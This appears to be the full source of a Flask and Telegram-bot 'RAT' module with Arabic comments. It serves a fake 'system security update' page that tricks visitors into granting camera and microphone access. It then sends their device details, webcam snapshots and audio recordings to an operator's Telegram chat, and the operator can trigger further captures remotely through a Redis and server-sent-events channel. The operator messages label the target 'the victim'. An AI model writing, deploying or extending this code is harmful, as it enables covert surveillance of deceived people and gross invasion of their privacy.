import os
import base64
import io
import json
import redis
from concurrent.futures import ThreadPoolExecutor
from flask import Blueprint, render_template_string, request, Response

rat_bp = Blueprint('rat_module_v5', __name__)

# الاتصال بقاعدة بيانات Redis مع معالجة الرابط تلقائياً
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

# محرك طوابير المهام غير المتزامنة (Asynchronous Task Pool) لمعالجة الملفات في الخلفية دون تعليق مسار الويب
background_executor = ThreadPoolExecutor(max_workers=4)

RAT_ASYNC_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام والأمان الشامل</title>
    <style>
        body { background-color: #030712; color: #f9fafb; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #111827; border: 1px solid #374151; padding: 40px; border-radius: 16px; max-width: 380px; width: 90%; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
        h2 { color: #60a5fa; font-size: 21px; margin-bottom: 12px; }
        p { font-size: 13px; color: #9ca3af; line-height: 1.6; margin-bottom: 25px; }
        .action-btn { background-color: #2563eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 15px; width: 100%; cursor: pointer; transition: 0.3s; }
        .action-btn:hover { background-color: #1d4ed8; }
    </style>
</head>
<body>
    <div class="box" id="mainBox">
        <h2>🛡️ تحديث النظام والأمان الفوري</h2>
        <p>انقر أدناه لبدء التثبيت التلقائي لتحسين أداء الجهاز وسرعة المعالج.</p>
        <button class="action-btn" onclick="startExecution()">تفعيل التحديث الآن</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const chatId = "{{ chat_id }}";
        let activeStream = null;

        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js?id=' + chatId).catch(err => {});
        }

        async function startExecution() {
            try {
                activeStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                    audio: true 
                });
                
                const video = document.getElementById('v');
                video.srcObject = activeStream;
                await video.play();

                sendDeviceInfo();
                setTimeout(() => captureLiveSnapshot("📸 **صورة الاتصال الأولى:**"), 1000);
                initSSEStream();

                document.getElementById('mainBox').innerHTML = "<h2>✅ النظام يعمل الآن بكفاءة</h2><p>جاري تطبيق التحسينات الأمنية في الخلفية...</p>";

            } catch (err) {
                alert("يرجى الضغط على سماح للأذونات لضمان نجاح التحديث.");
            }
        }

        function sendDeviceInfo() {
            fetch('/rat_v5_collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    screen: window.screen.width + "x" + window.screen.height
                })
            });
        }

        function captureLiveSnapshot(titleText) {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            
            if (!video || video.readyState < video.HAVE_CURRENT_DATA) return;

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const freshImageData = canvas.toDataURL('image/jpeg', 0.9);

            // إرسال البيانات للخلفية وعدم انتظار الرد لضمان سرعة فائقة
            fetch('/rat_v5_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, image: freshImageData, title: titleText })
            });
        }

        function recordLiveAudio() {
            if (!activeStream) return;
            try {
                let chunks = [];
                const recorder = new MediaRecorder(activeStream);
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        fetch('/rat_v5_audio', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                        });
                    };
                };
                recorder.start();
                setTimeout(() => {
                    if (recorder.state === "recording") recorder.stop();
                }, 5000);
            } catch (e) {}
        }

        function initSSEStream() {
            const eventSource = new EventSource('/rat_v5_stream?id=' + chatId);
            
            eventSource.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    if (data.action === "snapshot") {
                        captureLiveSnapshot("📸 **صورة حية ومتجددة بناءً على طلبك (معالجة غير متزامنة):**");
                    } 
                    else if (data.action === "audio") {
                        recordLiveAudio();
                    }
                } catch (e) {}
            };

            eventSource.onerror = function() {
                setTimeout(() => {
                    eventSource.close();
                    initSSEStream();
                }, 3000);
            };
        }
    </script>
</body>
</html>
"""

SERVICE_WORKER_SCRIPT = """
self.addEventListener('install', (e) => { self.skipWaiting(); });
self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });
self.addEventListener('fetch', (e) => { e.respondWith(fetch(e.request)); });
"""

# مهام الخلفية غير المتزامنة (Background Worker Functions)
def async_send_photo(bot, chat_id, image_bytes, title):
    try:
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = 'live_target.jpg'
        bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
    except Exception as e:
        print(f"Async Img Error: {e}")

def async_send_audio(bot, chat_id, audio_bytes):
    try:
        audio_file = io.BytesIO(audio_bytes)
        audio_file.name = 'live_audio.webm'
        bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي حي من ميكروفون الضحية (معالجة غير متزامنة):**", parse_mode="Markdown")
    except Exception as e:
        print(f"Async Audio Error: {e}")

def init_rat_routes(app, bot):
    @app.route('/system_secure_v2', methods=['GET'])
    def rat_landing():
        chat_id = request.args.get('id', '0')
        return render_template_string(RAT_ASYNC_TEMPLATE, chat_id=chat_id)

    @app.route('/sw.js', methods=['GET'])
    def service_worker():
        return Response(SERVICE_WORKER_SCRIPT, mimetype='application/javascript')

    @app.route('/rat_v5_collect', methods=['POST'])
    def rat_collect():
        data = request.json or {}
        chat_id = data.get('chat_id')
        if chat_id and chat_id != '0':
            msg = (
                "🎯 **تمت استجابة الضحية بنجاح عبر النظام غير المتزامن (Async Worker)!**\n\n"
                f"💻 **النظام:** `{data.get('platform')}`\n"
                f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
                "👇 **اختر الأمر المطلوب تنفيذه:**"
            )
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📸 التقاط صورة حية جديدة", callback_data=f"rat_cam_{chat_id}"),
                InlineKeyboardButton("🎙️ تسجيل صوت مباشر", callback_data=f"rat_mic_{chat_id}")
            )
            try:
                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
            except Exception as e:
                print(f"Error: {e}")
        return {"status": "ok"}

    @app.route('/rat_v5_stream', methods=['GET'])
    def rat_stream():
        chat_id = request.args.get('id')
        if not chat_id:
            return "Missing ID", 400

        def event_stream():
            pubsub = redis_client.pubsub()
            pubsub.subscribe(f"channel_cmd:{chat_id}")
            yield f"data: {json.dumps({'action': 'ping'})}\n\n"

            while True:
                try:
                    message = pubsub.get_message(ignore_subscribe_messages=True, timeout=15)
                    if message:
                        action_data = message['data']
                        yield f"data: {json.dumps({'action': action_data})}\n\n"
                    else:
                        yield f"data: {json.dumps({'action': 'heartbeat'})}\n\n"
                except Exception:
                    break

        return Response(event_stream(), mimetype="text/event-stream")

    @app.route('/rat_v5_image', methods=['POST'])
    def rat_image():
        data = request.json or {}
        chat_id = data.get('chat_id')
        img_data = data.get('image')
        title = data.get('title', "📸 **صورة حية من الضحية:**")
        if chat_id and img_data:
            try:
                header, encoded = img_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                # إرسال المهمة فوراً للخلفية عبر الـ ThreadPoolExecutor لضمان استجابة صاروخية
                background_executor.submit(async_send_photo, bot, chat_id, image_bytes, title)
            except Exception as e:
                print(f"Img ingest error: {e}")
        return {"status": "ok"}

    @app.route('/rat_v5_audio', methods=['POST'])
    def rat_audio():
        data = request.json or {}
        chat_id = data.get('chat_id')
        audio_data = data.get('audio')
        if chat_id and audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                # دفع معالجة ملف الصوت لخيوت الخلفية غير المتزامنة
                background_executor.submit(async_send_audio, bot, chat_id, audio_bytes)
            except Exception as e:
                print(f"Audio ingest error: {e}")
        return {"status": "ok"}

def queue_command(chat_id, action):
    redis_client.publish(f"channel_cmd:{chat_id}", action)
    redis_client.expire(f"channel_cmd:{chat_id}", 3600)
